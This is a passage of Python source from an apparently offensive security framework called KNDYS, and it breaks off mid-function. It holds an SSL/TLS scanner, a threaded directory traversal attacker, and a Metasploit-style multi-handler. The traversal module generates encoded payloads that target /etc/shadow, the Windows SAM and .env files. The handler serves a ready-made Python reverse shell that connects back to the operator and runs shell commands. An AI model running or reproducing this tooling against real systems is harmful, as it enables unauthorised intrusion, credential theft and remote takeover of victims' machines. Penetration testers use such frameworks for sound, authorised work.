                    san = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
                    analysis['san'] = san.value.get_values_for_type(x509.DNSName)
                except Exception:
                    pass
                pub = cert.public_key()
                if hasattr(pub, 'key_size'):
                    analysis['key_size'] = pub.key_size
                analysis['key_type'] = pub.__class__.__name__.replace('PublicKey', '')
                analysis['is_self_signed'] = cert.subject == cert.issuer
            except Exception as exc:
                analysis['warnings'].append(f'Certificate parsing failed: {exc}')
        else:
            cert_dict = baseline.get('peer_cert_dict') or {}
            analysis['subject'] = cert_dict.get('subject')
            analysis['issuer'] = cert_dict.get('issuer')
            analysis['not_before'] = cert_dict.get('notBefore')
            analysis['not_after'] = cert_dict.get('notAfter')
        return analysis

    def _tls_version_scan(self, host, port, opts):
        if not hasattr(ssl, 'TLSVersion'):
            return []
        results = []
        server_name = opts['sni'] or host
        for version_label in opts['profile']['versions']:
            version_attr = getattr(ssl.TLSVersion, version_label, None)
            if version_attr is None:
                continue
            context = self._create_ssl_context(opts, min_version=version_attr, max_version=version_attr)
            supported = False
            try:
                if opts['rate_limiter']:
                    opts['rate_limiter'].wait_if_needed()
                with socket.create_connection((host, port), timeout=opts['timeout']) as sock:
                    with context.wrap_socket(sock, server_hostname=server_name) as tls:
                        supported = tls.version() is not None
            except Exception:
                supported = False
            label = version_label.replace('_', '.').upper()
            results.append({'version': label, 'supported': supported})
        return results

    def _cipher_suite_scan(self, host, port, opts):
        tests = []
        ciphers = [c.strip() for c in (opts['custom_ciphers'].split(',') if opts['custom_ciphers'] else opts['profile']['cipher_tests']) if c.strip()]
        server_name = opts['sni'] or host
        for cipher in ciphers:
            context = self._create_ssl_context(opts, ciphers=cipher)
            accepted = False
            try:
                if opts['rate_limiter']:
                    opts['rate_limiter'].wait_if_needed()
                with socket.create_connection((host, port), timeout=opts['timeout']) as sock:
                    with context.wrap_socket(sock, server_hostname=server_name):
                        accepted = True
            except Exception:
                accepted = False
            tests.append({'cipher': cipher, 'accepted': accepted})
        return tests

    def _test_session_resumption(self, host, port, opts):
        server_name = opts['sni'] or host
        try:
            context = self._create_ssl_context(opts)
            if opts['rate_limiter']:
                opts['rate_limiter'].wait_if_needed()
            with socket.create_connection((host, port), timeout=opts['timeout']) as sock:
                with context.wrap_socket(sock, server_hostname=server_name) as tls:
                    session = getattr(tls, 'session', None)
            if not session:
                return {'supported': False, 'detail': 'Session tickets unavailable'}
            if opts['rate_limiter']:
                opts['rate_limiter'].wait_if_needed()
            with socket.create_connection((host, port), timeout=opts['timeout']) as sock:
                with context.wrap_socket(sock, server_hostname=server_name, session=session) as resumed:
                    return {'supported': True, 'reused': resumed.session_reused}
        except Exception as exc:
            return {'supported': False, 'detail': str(exc)}
        return {'supported': False, 'detail': 'Unknown'}

    def _fetch_http_headers(self, host, port, opts):
        scheme = 'https'
        url = f"{scheme}://{host}:{port}/" if port not in {443, 8443, 9443} else f"{scheme}://{host}/"
        headers = {'User-Agent': self.config.get('user_agent', 'KNDYS-SSL')}
        try:
            response = requests.get(url, headers=headers, timeout=opts['timeout'], verify=False, allow_redirects=True)
            return {
                'url': response.url,
                'status': response.status_code,
                'hsts': response.headers.get('Strict-Transport-Security'),
                'csp': response.headers.get('Content-Security-Policy'),
                'expect_ct': response.headers.get('Expect-CT'),
                'server': response.headers.get('Server')
            }
        except Exception as exc:
            return {'error': str(exc)}

    def _score_ssl_findings(self, cert_info, baseline, versions, cipher_results, http_headers, opts):
        score = 100
        issues = []
        penalties = {'Critical': 35, 'High': 25, 'Medium': 15, 'Low': 5}

        def add_issue(severity, detail, remediation):
            nonlocal score
            issues.append({'severity': severity, 'detail': detail, 'remediation': remediation})
            score = max(0, score - penalties.get(severity, 10))

        days = cert_info.get('days_remaining')
        if days is not None:
            if days < 0:
                add_issue('Critical', 'Certificate expired', 'Renew certificate immediately')
            elif days < 14:
                add_issue('High', f'Certificate expires in {days} day(s)', 'Renew certificate soon')
            elif days < 30:
                add_issue('Medium', f'Certificate expires in {days} day(s)', 'Plan certificate renewal')
        if cert_info.get('is_self_signed'):
            add_issue('High', 'Self-signed certificate detected', 'Deploy certificates issued by a trusted CA')
        key_size = cert_info.get('key_size')
        if key_size and key_size < 2048:
            add_issue('High', f'Weak RSA key size ({key_size} bits)', 'Use >=2048-bit RSA or elliptic curve keys')
        sig_alg = (cert_info.get('signature_algorithm') or '').lower()
        if sig_alg and ('md5' in sig_alg or 'sha1' in sig_alg):
            add_issue('High', f'Insecure signature algorithm ({sig_alg})', 'Reissue certificate with SHA-256 or better')

        for entry in versions:
            version = entry['version']
            if entry['supported'] and version in {'TLSV1', 'TLSV1.0', 'TLSV1.1'}:
                add_issue('High', f'Deprecated protocol enabled: {version}', 'Disable TLS 1.0/1.1 support')

        for cipher in cipher_results:
            if cipher['accepted']:
                add_issue('High', f"Legacy cipher accepted: {cipher['cipher']}", 'Disable export/legacy cipher suites')

        if opts['ocsp'] and not baseline.get('ocsp_stapled'):
            add_issue('Low', 'No OCSP stapling detected', 'Enable OCSP stapling')

        if http_headers and not http_headers.get('error'):
            if not http_headers.get('hsts'):
                add_issue('Medium', 'Missing Strict-Transport-Security header', 'Deploy HSTS to enforce HTTPS')

        if score >= 90:
            grade = 'A'
        elif score >= 80:
            grade = 'B'
        elif score >= 65:
            grade = 'C'
        elif score >= 50:
            grade = 'D'
        else:
            grade = 'F'
        return {'score': score, 'grade': grade, 'issues': issues}

    def _render_ssl_console(self, summary):
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SSL/TLS SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Score: {summary['score']} ({summary['grade']}) | Duration: {summary['duration']:.2f}s{Style.RESET_ALL}")
        cert = summary['certificate']
        print(f"{Fore.CYAN}[*] Certificate: {cert.get('subject', 'n/a')}{Style.RESET_ALL}")
        if cert.get('not_after'):
            print(f"{Fore.CYAN} Valid Until: {cert['not_after']} ({cert.get('days_remaining')} days remaining){Style.RESET_ALL}")
        cipher = summary['baseline'].get('cipher')
        if cipher:
            print(f"{Fore.CYAN}[*] Current Cipher: {cipher.get('name')} ({cipher.get('bits')} bit){Style.RESET_ALL}")
        if summary['issues']:
            print(f"\n{Fore.RED}[!] Findings ({len(summary['issues'])}){Style.RESET_ALL}")
            for issue in summary['issues'][:5]:
                print(f" - {issue['severity']}: {issue['detail']}")
        else:
            print(f"\n{Fore.GREEN}[+] No critical SSL/TLS weaknesses detected{Style.RESET_ALL}")

    def _export_ssl_results(self, summary):
        safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', summary['target'])
        json_file = f"ssl_scan_{safe_target}_{summary['timestamp']}.json"
        with open(json_file, 'w', encoding='utf-8') as fh:
            json.dump(summary, fh, indent=2)
        txt_file = f"ssl_scan_{safe_target}_{summary['timestamp']}_report.txt"
        with open(txt_file, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("SSL/TLS ANALYSIS REPORT - KNDYS FRAMEWORK\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {summary['target']}\n")
            fh.write(f"Mode: {summary['mode']} | Score: {summary['score']} ({summary['grade']})\n")
            fh.write(f"Duration: {summary['duration']:.2f}s\n\n")
            fh.write("Certificate:\n")
            fh.write("-" * 78 + "\n")
            cert = summary['certificate']
            for key in ['subject', 'issuer', 'not_before', 'not_after', 'key_type', 'key_size', 'signature_algorithm']:
                fh.write(f" {key.replace('_', ' ').title()}: {cert.get(key, 'n/a')}\n")
            if cert.get('san'):
                fh.write(f" SAN: {', '.join(cert['san'][:10])}\n")
            fh.write("\nFindings:\n")
            fh.write("-" * 78 + "\n")
            if summary['issues']:
                for issue in summary['issues']:
                    fh.write(f" - {issue['severity']}: {issue['detail']}\n")
                    fh.write(f" Remediation: {issue['remediation']}\n")
            else:
                fh.write(" None\n")
            fh.write("\nTLS Versions:\n")
            fh.write("-" * 78 + "\n")
            for version in summary['protocols']:
                fh.write(f" - {version['version']}: {'SUPPORTED' if version['supported'] else 'not supported'}\n")
            fh.write("\nCipher Tests:\n")
            fh.write("-" * 78 + "\n")
            for cipher in summary['ciphers']:
                fh.write(f" - {cipher['cipher']}: {'ACCEPTED' if cipher['accepted'] else 'rejected'}\n")
            fh.write("\nHTTP Headers:\n")
            fh.write("-" * 78 + "\n")
            if summary['http_headers'] and not summary['http_headers'].get('error'):
                for key, value in summary['http_headers'].items():
                    fh.write(f" {key}: {value}\n")
            elif summary['http_headers'].get('error'):
                fh.write(f" Error: {summary['http_headers']['error']}\n")
        print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")

    def run_dir_traversal(self):
        """Adaptive directory traversal analyzer"""
        opts = self.module_options
        url = opts['url']
        method = (opts.get('method', 'get') or 'get').lower()
        parameter = (opts.get('parameter') or '').strip()
        marker = (opts.get('marker', 'FUZZ') or 'FUZZ')
        depth = max(1, self._safe_int(opts.get('depth'), 6, 1, 12))
        payload_profile = (opts.get('payload_profile', 'balanced') or 'balanced').lower()
        encodings_raw = opts.get('encodings', 'standard,url,double,nullbyte,win') or 'standard'
        encodings = [e.strip().lower() for e in encodings_raw.split(',') if e.strip()]
        platform = (opts.get('platform', 'auto') or 'auto').lower()
        wordlist = (opts.get('wordlist') or '').strip()
        threads = max(1, min(self._safe_int(opts.get('threads'), 10, 1, 64), 64))
        timeout = max(1.0, float(opts.get('timeout', '6') or 6))
        allow_redirects = (opts.get('allow_redirects', 'false') or 'false').lower() == 'true'
        verify_ssl = (opts.get('verify_ssl', 'false') or 'false').lower() == 'true'
        sensitive_only = (opts.get('sensitive_only', 'false') or 'false').lower() == 'true'
        post_data = opts.get('post_data', '')
        retry_failed = (opts.get('retry_failed', 'true') or 'true').lower() == 'true'
        interesting_status = {
            int(s.strip()) for s in (opts.get('interesting_status', '200,206,500,403') or '200').split(',') if s.strip().isdigit()
        }
        custom_headers = self._parse_header_string(opts.get('custom_headers', ''))

        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*18}DIRECTORY TRAVERSAL LAB - KNDYS v3.0{' '*18}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Method: {method.upper()} | Parameter: {parameter or 'auto'} | Depth: {depth}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Profile: {payload_profile.title()} | Threads: {threads} | Timeout: {timeout:.1f}s{Style.RESET_ALL}")

        session = requests.Session()
        session.headers.update({'User-Agent': self.config['user_agent']})
        if custom_headers:
            session.headers.update(custom_headers)

        targets = self._load_traversal_targets(wordlist, platform)
        payloads = self._build_traversal_payloads(depth, targets, payload_profile, encodings)

        if not payloads:
            print(f"{Fore.YELLOW}[!] No payloads generated. Adjust depth/profile/wordlist options.{Style.RESET_ALL}")
            return

        injection = self._build_traversal_injection(url, method, parameter, marker, post_data)
        if not injection:
            print(f"{Fore.RED}[!] Unable to build injection strategy for supplied URL/options{Style.RESET_ALL}")
            return

        baseline_token = f"kndys_probe_{int(time.time())}_{random.randint(1000,9999)}.txt"
        baseline_request = self._make_traversal_request(injection, baseline_token)
        baseline_response = self._send_dir_traversal_request(
            session, baseline_request, timeout, allow_redirects, verify_ssl, retry_failed
        )
        baseline_profile = {
            'status': getattr(baseline_response, 'status_code', None),
            'length': len(baseline_response.content) if hasattr(baseline_response, 'content') else 0
        }

        indicators = self._dir_traversal_keywords(platform)

        findings = []
        errors = []
        start_time = time.time()

        def worker(payload_meta):
            req = self._make_traversal_request(injection, payload_meta['value'])
            response = self._send_dir_traversal_request(
                session, req, timeout, allow_redirects, verify_ssl, retry_failed
            )
            if isinstance(response, dict) and response.get('error'):
                return {'error': response['error'], 'payload': payload_meta['value']}
            return self._analyze_dir_traversal_response(
                response,
                payload_meta,
                baseline_profile,
                interesting_status,
                indicators,
                sensitive_only
            )

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_map = {executor.submit(worker, payload_meta): payload_meta for payload_meta in payloads}
            for future in concurrent.futures.as_completed(future_map):
                result = future.result()
                if not result:
                    continue
                if result.get('error'):
                    errors.append(result)
                    continue
                findings.append(result)

        duration = time.time() - start_time
        total_payloads = len(payloads)
        severity_rank = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3}
        findings.sort(key=lambda item: severity_rank.get(item['severity'], 4))

        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}TRAVERSAL SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Payloads tested : {Fore.CYAN}{total_payloads}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")

        if findings:
            print(f"\n{Fore.GREEN}[+] Top Findings{Style.RESET_ALL}")
            for finding in findings[:5]:
                print(f" {Fore.YELLOW}{finding['severity']:<8}{Style.RESET_ALL} {finding['payload']} → {finding['status']} ({finding['evidence'][0]['value']})")
        else:
            print(f"\n{Fore.YELLOW}[*] No definitive traversal impact detected{Style.RESET_ALL}")

        report_paths = self._export_dir_traversal_results(
            url,
            findings,
            errors,
            total_payloads,
            duration,
            payload_profile,
            depth
        )
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")

    def _parse_header_string(self, header_str):
        headers = {}
        if not header_str:
            return headers
        for line in header_str.splitlines():
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
        return headers

    def _load_traversal_targets(self, wordlist_path, platform):
        linux_targets = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/group', '/etc/ssh/sshd_config',
            '/proc/self/environ', '/var/log/auth.log', '/var/log/secure', '/var/www/html/config.php'
        ]
        windows_targets = [
            'windows/win.ini', 'windows/system.ini', 'windows/system32/drivers/etc/hosts',
            'windows/system32/config/sam', 'windows/system32/config/system', 'boot.ini'
        ]
        common_targets = ['WEB-INF/web.xml', '.env', 'appsettings.json', 'config.php', 'phpinfo.php', 'server-status']

        targets = []
        if platform in ('auto', 'linux'):
            targets.extend(linux_targets)
        if platform in ('auto', 'windows'):
            targets.extend(windows_targets)
        targets.extend(common_targets)

        if wordlist_path and os.path.exists(wordlist_path):
            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as fh:
                    for line in fh:
                        line = line.strip()
                        if line:
                            targets.append(line)
            except Exception:
                print(f"{Fore.YELLOW}[!] Failed to read wordlist: {wordlist_path}{Style.RESET_ALL}")

        seen = set()
        unique = []
        for item in targets:
            normalized = item.strip().lstrip('/')
            if normalized and normalized not in seen:
                seen.add(normalized)
                unique.append(normalized)
        return unique

    def _build_traversal_payloads(self, depth, targets, profile, encodings):
        limits = {
            'fast': {'max_targets': 8, 'max_depth': min(depth, 4)},
            'balanced': {'max_targets': 18, 'max_depth': min(depth, 6)},
            'deep': {'max_targets': min(32, len(targets)), 'max_depth': depth}
        }
        limit = limits.get(profile, limits['balanced'])
        max_depth = limit['max_depth']
        selected_targets = targets[:limit['max_targets'] or len(targets)]
        payloads = []
        seen = set()

        for target in selected_targets:
            for level in range(1, max_depth + 1):
                base = '../' * level + target
                variations = [('standard', base)]
                if 'url' in encodings:
                    variations.append(('url', quote(base)))
                if 'double' in encodings:
                    variations.append(('double', quote(quote(base))))
                if 'win' in encodings:
                    win_payload = ('..\\' * level) + target.replace('/', '\\')
                    variations.append(('win', win_payload))
                if 'nullbyte' in encodings:
                    variations.append(('nullbyte', base + '%00'))

                for encoding, value in variations:
                    if value in seen:
                        continue
                    seen.add(value)
                    payloads.append({
                        'value': value,
                        'target': target,
                        'depth': level,
                        'encoding': encoding
                    })
        return payloads

    def _build_traversal_injection(self, url, method, parameter, marker, post_data):
        method = method.lower()
        parsed = urlparse(url)
        base_url = parsed._replace(query='', fragment='').geturl() or url
        base_params = dict(parse_qsl(parsed.query or '', keep_blank_values=True))

        if marker and marker in url:
            return {
                'mode': 'marker',
                'marker': marker,
                'url_template': url,
                'method': method
            }

        if parameter:
            if method == 'get':
                return {
                    'mode': 'param_get',
                    'method': method,
                    'base_url': base_url,
                    'base_params': base_params,
                    'parameter': parameter
                }
            else:
                body_params = dict(parse_qsl(post_data or '', keep_blank_values=True))
                return {
                    'mode': 'param_post',
                    'method': method,
                    'base_url': base_url,
                    'base_params': base_params,
                    'base_data': body_params,
                    'parameter': parameter
                }

        return {
            'mode': 'path',
            'method': method,
            'base_url': url.rstrip('/'),
            'base_params': base_params
        }

    def _make_traversal_request(self, spec, payload):
        method = spec['method']
        if spec['mode'] == 'marker':
            return {'method': method, 'url': spec['url_template'].replace(spec['marker'], payload)}
        if spec['mode'] == 'param_get':
            params = dict(spec['base_params'])
            params[spec['parameter']] = payload
            return {'method': method, 'url': spec['base_url'], 'params': params}
        if spec['mode'] == 'param_post':
            params = dict(spec['base_params'])
            data = dict(spec['base_data'])
            data[spec['parameter']] = payload
            return {'method': method, 'url': spec['base_url'], 'params': params, 'data': data}
        params = dict(spec.get('base_params') or {})
        base = spec['base_url']
        separator = '' if base.endswith('/') else '/'
        return {'method': method, 'url': f"{base}{separator}{payload}", 'params': params}

    def _send_dir_traversal_request(self, session, request_args, timeout, allow_redirects, verify_ssl, retry_failed):
        for attempt in range(2 if retry_failed else 1):
            try:
                response = session.request(
                    request_args['method'].upper(),
                    request_args['url'],
                    params=request_args.get('params'),
                    data=request_args.get('data'),
                    timeout=timeout,
                    allow_redirects=allow_redirects,
                    verify=verify_ssl
                )
                return response
            except Exception as exc:
                last_error = str(exc)
        return {'error': last_error}

    def _dir_traversal_keywords(self, platform):
        keywords = [
            ('root:x:0:0', 'High'),
            ('daemon:', 'High'),
            ('/bin/bash', 'Medium'),
            ('[boot loader]', 'High'),
            ('[fonts]', 'Medium'),
            ('BEGIN RSA PRIVATE KEY', 'Critical'),
            ('APP_ENV', 'Medium'),
            ('<configuration>', 'Medium'),
            ('db_password', 'High'),
            ('<system.webServer>', 'Medium')
        ]
        if platform == 'linux':
            keywords.append(('x:0:0:root', 'High'))
        if platform == 'windows':
            keywords.append(('[extensions]', 'High'))
        return keywords

    def _analyze_dir_traversal_response(self, response, payload_meta, baseline, interesting_status, indicators, sensitive_only):
        if not response or not hasattr(response, 'content'):
            return None

        body = response.content
        text_sample = body[:4096].decode('latin-1', errors='ignore')
        matches = []
        lower_sample = text_sample.lower()
        for keyword, severity in indicators:
            if keyword.lower() in lower_sample:
                matches.append({'type': 'keyword', 'value': keyword, 'severity': severity})

        binary_hits = []
        if body.startswith(b'PK\x03\x04'):
            binary_hits.append({'type': 'signature', 'value': 'ZIP archive header', 'severity': 'Medium'})
        if body.startswith(b'\x7fELF'):
            binary_hits.append({'type': 'signature', 'value': 'ELF binary header', 'severity': 'Medium'})

        length_delta = abs(len(body) - (baseline.get('length') or 0))
        status_interesting = response.status_code in interesting_status

        if sensitive_only and not matches:
            return None

        if not matches and not binary_hits and not status_interesting and length_delta < 200:
            return None

        evidence = matches or binary_hits or [{'type': 'length_delta', 'value': length_delta, 'severity': 'Low'}]
        severity = 'Low'
        if any(item['severity'] == 'Critical' for item in evidence):
            severity = 'Critical'
        elif any(item['severity'] == 'High' for item in evidence):
            severity = 'High'
        elif any(item['severity'] == 'Medium' for item in evidence) or length_delta > 500:
            severity = 'Medium'

        snippet = text_sample[:200].replace('\n', ' ').replace('\r', ' ')
        return {
            'severity': severity,
            'payload': payload_meta['value'],
            'target': payload_meta['target'],
            'depth': payload_meta['depth'],
            'encoding': payload_meta['encoding'],
            'status': response.status_code,
            'length': len(body),
            'url': response.url,
            'evidence': evidence,
            'snippet': snippet
        }

    def _export_dir_traversal_results(self, url, findings, errors, total_payloads, duration, profile, depth):
        timestamp = int(time.time())
        host = urlparse(url).netloc.replace(':', '_') or 'target'
        base_name = f"dir_traversal_{host}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"

        data = {
            'target': url,
            'timestamp': timestamp,
            'profile': profile,
            'depth': depth,
            'duration': duration,
            'payloads_tested': total_payloads,
            'findings': findings,
            'errors': errors[:20]
        }
        with open(json_path, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)

        with open(txt_path, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("DIRECTORY TRAVERSAL REPORT - KNDYS FRAMEWORK\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {url}\n")
            fh.write(f"Profile: {profile} | Depth: {depth}\n")
            fh.write(f"Payloads Tested: {total_payloads}\n")
            fh.write(f"Findings: {len(findings)}\n")
            fh.write(f"Duration: {duration:.2f}s\n\n")
            if findings:
                fh.write("Findings:\n" + "-" * 78 + "\n")
                for finding in findings:
                    fh.write(f"- {finding['severity']} | Payload: {finding['payload']} | Status: {finding['status']}\n")
                    fh.write(f" Evidence: {finding['evidence'][0]['value']}\n")
                    fh.write(f" Snippet: {finding['snippet']}\n\n")
            else:
                fh.write("No definitive traversal impact detected.\n\n")
            if errors:
                fh.write("Errors:\n" + "-" * 78 + "\n")
                for error in errors[:10]:
                    fh.write(f"- {error['payload']}: {error['error']}\n")

        return [json_path, txt_path]
    
    # ============ EXPLOIT MODULES ============
    
    def run_multi_handler(self):
        """High-performance multi/handler with staging, monitoring, and session controls"""

        def truthy(value):
            return str(value).strip().lower() in {'1', 'true', 'yes', 'on'}

        @dataclass
        class HandlerSession:
            sid: int
            address: Tuple[str, int]
            transport: str
            sock: socket.socket
            start_time: float
            last_seen: float
            transcript_path: Optional[str]
            active: bool = True
            buffer: deque = field(default_factory=lambda: deque(maxlen=120))
            thread: Optional[threading.Thread] = None

        class MultiHandlerEngine:
            def __init__(self, profile, framework):
                self.profile = profile
                self.framework = framework
                self.sessions: Dict[int, HandlerSession] = {}
                self.session_lock = threading.Lock()
                self.stop_event = threading.Event()
                self.sid_counter = itertools.count(1)
                self.listener_socket = None
                self.http_server = None
                self.server_threads: List[threading.Thread] = []
                self.stage_bytes = None
                stage_path = profile['stage_payload']
                if stage_path:
                    try:
                        self.stage_bytes = Path(stage_path).expanduser().read_bytes()
                        print(f"{Fore.GREEN}[*] Loaded stage payload: {stage_path}{Style.RESET_ALL}")
                    except Exception as exc:
                        print(f"{Fore.YELLOW}[!] Could not read stage payload ({stage_path}): {exc}{Style.RESET_ALL}")
                self.transcript_root = Path(profile['session_log']).expanduser()
                if profile['record_sessions']:
                    self.transcript_root.mkdir(parents=True, exist_ok=True)

            def start(self):
                self._print_profile()
                transports = self.profile['transports']
                if 'tcp' in transports:
                    tcp_thread = threading.Thread(target=self._start_tcp_listener, name='tcp-handler', daemon=True)
                    tcp_thread.start()
                    self.server_threads.append(tcp_thread)
                if any(t in {'http', 'https'} for t in transports):
                    https = 'https' in transports
                    http_thread = threading.Thread(target=self._start_stage_server, args=(https,), name='stage-server', daemon=True)
                    http_thread.start()
                    self.server_threads.append(http_thread)
                monitor_thread = threading.Thread(target=self._monitor_sessions, name='session-monitor', daemon=True)
                monitor_thread.start()
                self.server_threads.append(monitor_thread)
                try:
                    self._command_loop()
                finally:
                    self.stop_event.set()
                    self._shutdown()

            def _print_profile(self):
                print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
                print(f"{Fore.CYAN}║{' '*18}KNDYS MULTI-HANDLER CORE{' '*19}║{Style.RESET_ALL}")
                print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] LHOST : {self.profile['lhost']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] LPORT : {self.profile['lport']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] Transports : {', '.join(self.profile['transports'])}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] MaxSessions: {self.profile['max_sessions']}{Style.RESET_ALL}")
                if self.profile['record_sessions']:
                    print(f"{Fore.CYAN}[*] Logging to : {self.transcript_root}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] Ctrl+C or type 'exit' to stop handler{Style.RESET_ALL}\n")

            def _start_tcp_listener(self):
                try:
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    server.bind((self.profile['lhost'], self.profile['lport']))
                    server.listen(self.profile['backlog'])
                    server.settimeout(1)
                    self.listener_socket = server
                    print(f"{Fore.GREEN}[+] TCP listener up on {self.profile['lhost']}:{self.profile['lport']}{Style.RESET_ALL}")
                    while not self.stop_event.is_set():
                        try:
                            client, addr = server.accept()
                        except socket.timeout:
                            continue
                        except Exception as exc:
                            if not self.stop_event.is_set():
                                print(f"{Fore.RED}[!] Listener error: {exc}{Style.RESET_ALL}")
                            break
                        client.settimeout(self.profile['command_timeout'])
                        if self._session_count() >= self.profile['max_sessions']:
                            print(f"{Fore.YELLOW}[!] Max sessions reached; rejecting connection from {addr[0]}{Style.RESET_ALL}")
                            client.close()
                            continue
                        self._register_session(client, addr, 'tcp')
                except Exception as exc:
                    print(f"{Fore.RED}[!] Failed to start TCP listener: {exc}{Style.RESET_ALL}")

            def _start_stage_server(self, use_ssl):
                class StageHTTPServer(ThreadingMixIn, HTTPServer):
                    daemon_threads = True

                engine = self

                class StageHandler(BaseHTTPRequestHandler):
                    server_version = 'KNDYSStage/1.1'
                    error_message_format = """<!doctype html><title>Error</title><h1>{code}</h1><p>{message}</p>"""

                    def log_message(self, format, *args):
                        if engine.profile['http_logging']:
                            print(f"{Fore.BLUE}[HTTP] " + format % args + Style.RESET_ALL)

                    def do_GET(self):
                        engine._handle_stage_request(self, None)

                    def do_POST(self):
                        length = int(self.headers.get('Content-Length', '0') or 0)
                        body = self.rfile.read(length) if length else None
                        engine._handle_stage_request(self, body)

                stage_port = self.profile['stage_port']
                if not stage_port:
                    stage_port = self.profile['lport'] + 1 if self.profile['lport'] < 65535 else self.profile['lport']
                try:
                    httpd = StageHTTPServer((self.profile['lhost'], stage_port), StageHandler)
                    httpd.engine = self
                    if use_ssl:
                        cert, key = self.profile['ssl_cert'], self.profile['ssl_key']
                        if not (cert and key):
                            print(f"{Fore.YELLOW}[!] HTTPS requested but ssl_cert/ssl_key missing. Falling back to HTTP.{Style.RESET_ALL}")
                        else:
                            try:
                                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                                context.load_cert_chain(certfile=cert, keyfile=key)
                                httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
                                print(f"{Fore.GREEN}[+] HTTPS stage server up on {self.profile['lhost']}:{stage_port}{Style.RESET_ALL}")
                            except Exception as exc:
                                print(f"{Fore.YELLOW}[!] Failed to enable TLS: {exc}. Serving over HTTP.{Style.RESET_ALL}")
                    if not use_ssl:
                        print(f"{Fore.GREEN}[+] HTTP stage server up on {self.profile['lhost']}:{stage_port}{Style.RESET_ALL}")
                    self.http_server = httpd
                    while not self.stop_event.is_set():
                        httpd.handle_request()
                except OSError as exc:
                    print(f"{Fore.YELLOW}[!] Stage server not started: {exc}{Style.RESET_ALL}")

            def _handle_stage_request(self, handler, body):
                addr = handler.client_address[0]
                if body:
                    print(f"{Fore.CYAN}[+] Stage beacon from {addr}, {len(body)} bytes POSTed{Style.RESET_ALL}")
                payload = self.stage_bytes
                if not payload:
                    payload = self._default_stage().encode('utf-8')
                handler.send_response(200)
                handler.send_header('Content-Type', self.profile['stage_mime'])
                handler.send_header('Content-Length', str(len(payload)))
                handler.end_headers()
                handler.wfile.write(payload)

            def _default_stage(self):
                host = self.profile['lhost']
                port = self.profile['lport']
                return f"""#!/usr/bin/env python3
import socket,subprocess
s=socket.socket()
s.connect(("{host}",{port}))
while True:
    data=s.recv(4096)
    if not data:
        break
    proc=subprocess.Popen(data.decode('utf-8','ignore'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    stdout,stderr=proc.communicate()
    s.sendall(stdout+stderr)
"""

            def _register_session(self, client, addr, transport):
                sid = next(self.sid_counter)
                transcript_path = None
                if self.profile['record_sessions']:
                    transcript_path = self.transcript_root / f"session_{sid}_{addr[0]}_{int(time.time())}.log"
                session = HandlerSession(
                    sid=sid,
                    address=addr,
                    transport=transport,
                    sock=client,
                    start_time=time.time(),
                    last_seen=time.time(),
                    transcript_path=str(transcript_path) if transcript_path else None
                )
                with self.session_lock:
                    self.sessions[sid] = session
                print(f"{Fore.GREEN}[+] Session {sid} established from {addr[0]}:{addr[1]} ({transport}){Style.RESET_ALL}")
                worker = threading.Thread(target=self._session_worker, args=(session,), name=f'session-{sid}', daemon=True)
                session.thread = worker
                worker.start()

            def _session_worker(self, session: HandlerSession):
                sock = session.sock
                banner = self.profile['banner']
                auto_command = self.profile['auto_command']
                encoding = self.profile['encoding']
                try:
                    if banner:
                        sock.sendall((banner + '\n').encode(encoding, errors='ignore'))
                    if self.stage_bytes and session.transport == 'tcp':
                        sock.sendall(self.stage_bytes)
                    if auto_command:
                        sock.sendall(auto_command.encode(encoding, errors='ignore') + b'\n')
                    buffer = b''
                    while not self.stop_event.is_set() and session.active:
                        try:
